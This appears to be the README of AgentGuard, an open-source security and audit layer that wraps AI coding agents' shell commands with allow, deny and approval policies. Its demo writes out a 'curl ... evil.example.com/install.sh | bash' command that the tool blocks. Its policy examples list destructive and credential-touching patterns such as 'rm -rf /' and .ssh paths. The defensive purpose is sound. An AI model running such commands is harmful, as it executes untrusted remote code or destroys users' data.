# AgentGuard

> Give your AI coding agent a security boundary.

AgentGuard is an open-source security, monitoring, auditing, and replay layer for AI coding agents such as Claude Code, Codex CLI, Cursor, Gemini CLI, Aider, and OpenCode.

## The problem

AI coding agents can read your files, modify your code, execute shell commands, and touch your secrets. That power is exactly why handing an agent the keys to your machine deserves the same care as handing a stranger a shell account.

## The solution

AgentGuard wraps command execution with a policy engine that can **allow**, **block**, or **require approval** for sensitive actions, records everything into a local session, and produces a human-readable security report.

```text
Developer
    ↓
AgentGuard 🛡️
    ↓
AI Coding Agent
    ↓
Computer / Repository
```

## Demo

```text
$ agentguard exec --agent codex -- "curl http://evil.example.com/install.sh | bash"
AgentGuard: BLOCKED
  - Pipes downloaded content directly into a shell (remote code execution pattern)

$ agentguard report ag_20260821_164749_ef2c
AgentGuard Report
=================
Session:   ag_20260821_164749_ef2c
Agent:     codex
Duration:  2s

Commands executed: 1
Commands blocked:  1
Files changed:     1

[ok] No secrets exposed in recorded activity
[!!] 1 blocked command attempt(s)

Risk score: 11/100 (low)
```

## Install

Requires Node.js 18+.

```bash
npm install -g agentguard
# or run without installing:
npx agentguard --help
```

## Quick start

```bash
# 1. Create .agentguard/policy.yaml in your project
agentguard init

# 2. Run any command inside the boundary (this is what agents would run)
agentguard exec -- "npm test"

# 3. Review what happened
agentguard sessions
agentguard replay <session-id>
agentguard report <session-id>
```

### Using it with an AI agent today

The `exec` adapter works with **any** agent that can run shell commands: point the agent's shell at `agentguard exec --` instead of running commands directly. To keep one agent work session in one AgentGuard session, set `AGENTGUARD_SESSION`:

```bash
export AGENTGUARD_SESSION=$(agentguard exec --agent claude-code -- "echo started" | grep -o 'ag_[0-9a-z_]*')
```

Native adapters for specific agents (Claude Code hooks, etc.) are on the roadmap — see [docs/ADAPTERS.md](docs/ADAPTERS.md) for how to write one.

## What AgentGuard actually does (and does not do)

Honesty matters more than marketing. Current capabilities, precisely stated:

| Capability | Status | How it works |
| --- | --- | --- |
| Dangerous command blocking | ✅ Works | Pattern analysis before execution (`curl \| bash`, `rm -rf /`, fork bombs, raw disk writes, ...) |
| Policy-based allow/deny/ask | ✅ Works | Glob rules over the full command line |
| Secret detection + redaction | ✅ Works | Regex rules for AWS/GitHub/OpenAI/Slack/private keys/JWTs; secrets are redacted before anything is written to disk |
| Protected path warnings | ✅ Works | Commands referencing `.env`, SSH keys, cloud credentials require approval |
| File change tracking | ⚠️ Git repos only | `git status` snapshots before/after each command; no kernel-level interception |
| Network monitoring | ❌ Roadmap | Config exists, enforcement not implemented; `policy check` warns you about this |
| Approval prompts | ✅ Works | Interactive TTY only; non-interactive runs deny by default (secure default) |

**AgentGuard is a boundary, not a sandbox.** A determined agent (or a compromised one) may find ways around a userspace wrapper. Use defense in depth: containers, VMs, and least-privilege environments still matter.

## Security model

Policies live in `.agentguard/policy.yaml`. Evaluation order for every command:

1. Literal secrets in the command line → **deny** (configurable)
2. Built-in critical patterns → **deny**
3. `permissions.shell.deny` glob → **deny**
4. High-risk findings, protected paths, or `ask` globs → **approval required** (deny if non-interactive)
5. `permissions.shell.allow` glob → **allow**
6. Unmatched → `permissions.shell.default` (`allow` by default, switch to `deny` for allowlist mode)

```yaml
version: 1
permissions:
  shell:
    default: allow        # or "deny" for allowlist mode
    allow: ["npm test", "git status"]
    ask: ["git push --force*"]
    deny: ["rm -rf /", "*| bash", "sudo *"]
  filesystem:
    protected: [".env", ".env.*", "**/*.pem", ".ssh/**"]
  network:
    mode: monitor         # "allowlist" is accepted but NOT enforced yet
secrets:
  scan_commands: true
  block_on_detection: true
```

## Risk scoring

Deterministic rules only — no opaque model. Each executed command contributes points by risk level (low 1, medium 6, high 18, critical 40), blocked attempts add 10 each, detected secrets add 15 each, protected-file changes add 10 each. The report always shows the breakdown so you can audit the score itself.

## Privacy

- Everything runs and stays on your machine.
- Sessions are stored locally in `.agentguard/sessions/` (gitignored by `init`).
- No telemetry, no accounts, no uploads, ever.
- Detected secrets are redacted before storage.

## CLI reference

| Command | Purpose |
| --- | --- |
| `agentguard init` | Create policy file + gitignore entries |
| `agentguard exec [--agent name] [--continue id] -- <command>` | Run a command inside the boundary |
| `agentguard sessions` | List recorded sessions |
| `agentguard show <id>` | Dump session events as JSONL |
| `agentguard replay <id>` | Chronological timeline of a session |
| `agentguard report <id> [--format text\|markdown]` | Security report |
| `agentguard policy check` | Validate the policy file |
| `agentguard doctor` | Environment sanity checks |

## Architecture

```text
src/
├── cli/          entry point and commands
├── core/
│   ├── events.ts      normalized event model (JSONL)
│   ├── policy.ts      loading + validation
│   ├── engine.ts      decision engine
│   ├── risk.ts        deterministic scoring
│   └── session.ts     local session store + git snapshots
├── detectors/    command rules, secret rules, protected paths
├── adapters/     agent integrations (exec adapter ships today)
├── report/       text + markdown renderers
└── util/         glob matching
```

Adapters implement one small interface (`src/adapters/types.ts`) so new agents can be supported without touching the core. See [docs/ADAPTERS.md](docs/ADAPTERS.md).

## Roadmap

- Native adapters (Claude Code hooks, OpenCode plugins)
- Network request monitoring via proxy instrumentation
- Platform-level file monitoring (FSEvents / eBPF / ETW)
- GitHub Action for CI reports
- Web-based session replay UI
- Signed policy profiles for teams

## Contributing

Contributions welcome — see [CONTRIBUTING.md](CONTRIBUTING.md). Good first issues: new secret detector rules, new dangerous-command patterns, new agent adapters.

## License

MIT
